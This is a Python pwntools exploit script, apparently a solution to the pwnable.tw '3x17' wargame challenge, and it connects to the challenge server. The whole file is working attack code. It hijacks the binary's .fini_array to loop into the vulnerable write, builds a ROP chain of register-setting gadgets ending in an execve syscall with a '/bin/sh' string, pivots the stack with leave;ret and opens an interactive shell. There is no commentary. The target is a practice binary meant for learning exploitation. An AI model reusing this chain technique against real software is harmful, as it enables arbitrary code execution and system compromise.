#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("3x17")
libc = elf.libc

local = False

if local:
    p = process("./3x17")
    gdb.attach(p,'''''')
else:
    p = remote('chall.pwnable.tw', 10105)

elf = context.binary = ELF('./3x17', checksec=False)

vuln        = 0x401b6d
fini_arr    = 0x4b40f0
call_fini   = 0x402960

def exploit(addr, data):
    p.sendafter(b"addr:", str(addr))
    print("[+]Addr: Done")
    p.sendafter(b"data:", data)
    print("[+]Data: Done")
    input('?')

rdi_ret = 0x0000000000401696
rax_ret = 0x000000000041e4af
rdx_ret = 0x0000000000446e35
rsi_ret = 0x0000000000406c30
syscall = 0x00000000004022b4
ret     = 0x0000000000401016
leave_ret   = 0x0000000000401c4b

exploit(fini_arr,           p64(call_fini) + p64(vuln))
exploit(fini_arr + 0x8*2,   p64(rdx_ret) + p64(0))
exploit(fini_arr + 0x8*4,   p64(rsi_ret) + p64(0))
exploit(fini_arr + 0x8*6,   p64(rax_ret) + p64(0x3b))
exploit(fini_arr + 0x8*8,   p64(rdi_ret) + p64(fini_arr + 0x8 * 11))
exploit(fini_arr + 0x8*10,  p64(syscall)+ p64(0x0068732f6e69622f))
exploit(fini_arr,           p64(leave_ret))
p.sendline(b"/bin/sh")

p.interactive()